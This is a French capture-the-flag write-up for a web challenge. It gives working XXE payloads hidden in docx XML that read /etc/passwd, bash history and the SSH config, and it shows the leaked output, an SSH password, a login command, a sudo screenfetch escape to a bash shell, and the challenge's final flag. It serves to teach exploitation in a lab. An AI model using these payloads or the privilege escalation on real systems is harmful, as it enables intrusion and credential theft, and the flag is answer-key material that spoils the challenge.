Mission 4 
=============
Enonce
-------------

Brief de mission
~~~~~~~~~~~~~~~~~~~~~~
L'une de vos équipes de renseignement a réussi à identifier une application qui fait partie de la chaîne d'attaque de l'entité.

Objectifs de la mission
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Réaliser une intrusion sur l'application web hébergée par le serveur attaquant.
Récupérer les plans d'attaque de l'entité.



Web Exploit 
---------------
Le serveur permet d'upload un fichier docx.
Le premier upload permet d'ajouter un victimID dans les fichiers XML du docx.
Le second upload permet de lire ce victimID

On va donc tenter la XXE, qui fonctionne directement.

- Payload 1 : 

.. code-block:: xml

    <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
    <!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
    <Properties xmlns="http://schemas.openxmlformats.org/officeDocument/2006/extended-properties" xmlns:vt="http://schemas.openxmlformats.org/officeDocument/2006/docPropsVTypes"><Template>Normal.dotm</Template><TotalTime>0</TotalTime><Pages>&xxe;</Pages><Words>0</Words><Characters>4</Characters><Application>Microsoft Office Word</Application><DocSecurity>0</DocSecurity><Lines>1</Lines><Paragraphs>1</Paragraphs><ScaleCrop>false</ScaleCrop><Company>Reply</Company><LinksUpToDate>false</LinksUpToDate><CharactersWithSpaces>4</CharactersWithSpaces><VictimID>&xxe;</VictimID><SharedDoc>false</SharedDoc><HyperlinksChanged>false</HyperlinksChanged><AppVersion>16.0000</AppVersion></Properties>


- /etc/passwd : 

.. code-block:: console

    root               : x :    0 :    0 : root                         : /root                 : /bin/bash
    daemon             : x :    1 :    1 : daemon                       : /usr/sbin             : /usr/sbin/nologin
    bin                : x :    2 :    2 : bin                          : /bin                  : /usr/sbin/nologin
    sys                : x :    3 :    3 : sys                          : /dev                  : /usr/sbin/nologin
    sync               : x :    4 :65534 : sync                         : /bin                  : /bin/sync
    games              : x :    5 :   60 : games                        : /usr/games            : /usr/sbin/nologin
    man                : x :    6 :   12 : man                          : /var/cache/man        : /usr/sbin/nologin
    lp                 : x :    7 :    7 : lp                           : /var/spool/lpd        : /usr/sbin/nologin
    mail               : x :    8 :    8 : mail                         : /var/mail             : /usr/sbin/nologin
    news               : x :    9 :    9 : news                         : /var/spool/news       : /usr/sbin/nologin
    uucp               : x :   10 :   10 : uucp                         : /var/spool/uucp       : /usr/sbin/nologin
    proxy              : x :   13 :   13 : proxy                        : /bin                  : /usr/sbin/nologin
    www-data           : x :   33 :   33 : www-data                     : /var/www              : /usr/sbin/nologin
    backup             : x :   34 :   34 : backup                       : /var/backups          : /usr/sbin/nologin
    list               : x :   38 :   38 : Mailing List Manager         : /var/list             : /usr/sbin/nologin
    irc                : x :   39 :   39 : ircd                         : /run/ircd             : /usr/sbin/nologin
    _apt               : x :   42 :65534 :                              : /nonexistent          : /usr/sbin/nologin
    nobody             : x :65534 :65534 : nobody                       : /nonexistent          : /usr/sbin/nologin
    systemd-network    : x :  998 :  998 : systemd Network Management   : /                     : /usr/sbin/nologin
    systemd-timesync   : x :  997 :  997 : systemd Time Synchronization : /                     : /usr/sbin/nologin
    messagebus         : x :  100 :  101 :                              : /nonexistent          : /usr/sbin/nologin
    sshd               : x :  101 :65534 :                              : /run/sshd             : /usr/sbin/nologin
    document-user      : x :  999 :  996 :                              : /home/document-user   : /bin/sh
    executor           : x :  996 :  995 :                              : /home/executor        : /bin/bash
    administrator      : x :  995 :  994 :                              : /home/administrator   : /bin/bash



- Payload 2 : 

.. code-block:: xml

    <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
    <!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/hosts" >]>
    <Properties xmlns="http://schemas.openxmlformats.org/officeDocument/2006/extended-properties" xmlns:vt="http://schemas.openxmlformats.org/officeDocument/2006/docPropsVTypes"><Template>Normal.dotm</Template><TotalTime>0</TotalTime><Pages>&xxe;</Pages><Words>0</Words><Characters>4</Characters><Application>Microsoft Office Word</Application><DocSecurity>0</DocSecurity><Lines>1</Lines><Paragraphs>1</Paragraphs><ScaleCrop>false</ScaleCrop><Company>Reply</Company><LinksUpToDate>false</LinksUpToDate><CharactersWithSpaces>4</CharactersWithSpaces><VictimID>&xxe;</VictimID><SharedDoc>false</SharedDoc><HyperlinksChanged>false</HyperlinksChanged><AppVersion>16.0000</AppVersion></Properties>

- /etc/hosts : 

.. code-block:: console

    127.0.0.1 localhost ::1 localhost ip6-localhost ip6-loopback fe00:: ip6-localnet ff00:: ip6-mcastprefix ff02::1 ip6-allnodes ff02::2 ip6-allrouters 172.18.0.2 document-station 

On a tester l'accès a document-station mais c'est le serveur lui même, donc inutile. 
On va donc tester tous les .bash_history de tous les utilisateurs

Payload 3 : 
.. code-block:: console

    <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
    <!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "/home/document-user/.bash_history" >]>
    <Properties xmlns="http://schemas.openxmlformats.org/officeDocument/2006/extended-properties" xmlns:vt="http://schemas.openxmlformats.org/officeDocument/2006/docPropsVTypes"><Template>Normal.dotm</Template><TotalTime>0</TotalTime><Pages>&xxe;</Pages><Words>0</Words><Characters>4</Characters><Application>Microsoft Office Word</Application><DocSecurity>0</DocSecurity><Lines>1</Lines><Paragraphs>1</Paragraphs><ScaleCrop>false</ScaleCrop><Company>Reply</Company><LinksUpToDate>false</LinksUpToDate><CharactersWithSpaces>4</CharactersWithSpaces><VictimID>&xxe;</VictimID><SharedDoc>false</SharedDoc><HyperlinksChanged>false</HyperlinksChanged><AppVersion>16.0000</AppVersion></Properties>

/home/document-user/.bash_history : 

.. code-block:: console

    id
    htop
    cat /etc/passwd
    sudo su
    ps aux | grep python
    rm -rf /tmp/*
    ip --brief --color a
    whoami
    uname -a
    cat /plans/next-op.txt
    ls /var/log/
    vim .bashrc
    ls -la
    cd /app
    python3 app.py
    pip install -r requirements.txt
    export FLASK_ENV=production
    flask run --host=0.0.0.0 --port=5000
    echo "cABdTXRyUj5qgAEl0Zc0a" >> /tmp/exec_ssh_password.tmp
    ps aux | grep flask
    cd templates/
    vim index.html
    vim app.py
    export SECRET_KEY=$(head -n50 /dev/null | xxd | sha256sum | awk '{print $1}')
    grep -RiF "docx" .
    ls -la /tmp/
    vim README.md
    clear
    ls -lah /tmp
    exit
    vim /etc/hosts



Le fichier /plans/next-op.txt n'existe pas.
Par contre on un a mot de passe SSH : cABdTXRyUj5qgAEl0Zc0a

Mais le SSH n'existe pas sur le port 22, on va donc récupéré le fichier de config ssh

Payload 4

.. code-block:: xml

    <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
    <!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/ssh/sshd_config" >]>
    <Properties xmlns="http://schemas.openxmlformats.org/officeDocument/2006/extended-properties" xmlns:vt="http://schemas.openxmlformats.org/officeDocument/2006/docPropsVTypes"><Template>Normal.dotm</Template><TotalTime>0</TotalTime><Pages>&xxe;</Pages><Words>0</Words><Characters>4</Characters><Application>Microsoft Office Word</Application><DocSecurity>0</DocSecurity><Lines>1</Lines><Paragraphs>1</Paragraphs><ScaleCrop>false</ScaleCrop><Company>Reply</Company><LinksUpToDate>false</LinksUpToDate><CharactersWithSpaces>4</CharactersWithSpaces>
    <VictimID>&xxe;</VictimID><SharedDoc>false</SharedDoc><HyperlinksChanged>false</HyperlinksChanged><AppVersion>16.0000</AppVersion></Properties>

Truncate /etc/ssh/sshd_config : 


.. code-block:: console
    
    This is the sshd server system-wide configuration file. See 
    
    # sshd_config(5) for more information. 
    # This sshd was compiled with PATH=/usr/local/bin:/usr/bin:/bin:/usr/games 
    # The strategy used for options in the default sshd_config shipped with 
    # OpenSSH is to specify options with their default value where 
    # possible, but leave them commented. Uncommented options override the 
    # default value. 
    nclude /etc/ssh/sshd_config.d/*.conf 
    Port 22222


On peut donc se connecter au serveur avec ssh executor@163.172.67.183 -p 22222 

Et le mot de passe : cABdTXRyUj5qgAEl0Zc0a

Privesc 1 
-------------------
Une fois sur le serveur, on voit que le système est en read-only, cela limite les possibilités
Cependant il est tout de même possible d'écrire dans /dev/shm

On va tout de suite faire un sudo -l : 

.. code-block:: console

    Matching Defaults entries for executor on document-station:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

    User executor may run the following commands on document-station:
        (administrator) NOPASSWD: /usr/bin/screenfetch

On peut lancer screenfetch en tant qu'administrator. 

Dans le screenfetch -h on trouve un argument intéressant : 

-a 'PATH'          You can specify a custom ASCII art by passing the path
                      to a Bash script, defining `startline` and `fulloutput`
                      variables, and optionally `labelcolor` and `textcolor`.
                      See the `asciiText` function in the source code for more


On peut donc créer un script bash avec /bin/bash et faire : 

.. code-block:: console

    sudo -u administrator screenfetch -a /dev/shm/evil.sh

Contenu du script  : 

.. code-block:: console

    startline=1
    fulloutput="dumping app.py"
    /bin/bash 


Obtenir le flag
-------------------

Maintenant on a accès au user administrator 
Il y a deux fichiers intéressant dans le /home/administrator : 

- vault.kdbx
- logo.jpg 

Pour les récupérer en local : 

- On les affiche en base64 et on les copie colle sur notre machine et on décode le base64. 

Pour ouvrir le fichier vault.kdbx : 

- CVE : a priori rien ne correspond
- Bruteforce : rockyou n'a pas suffit
- Mot de passe :   
- Celui du SSH == KO
- Les données exifs de l'image "VullVastation secret" == KO
- Le logo en tant que fichier clé == Bingo !

On a maintenant accès au vault.kdbx

Il y a un une entrée "OPERATION NOTES" dont le mot de passe est le flag ! 

Flag : **RM{f5289180cb760ca5416760f3ca7ec80cd09bc1c3}**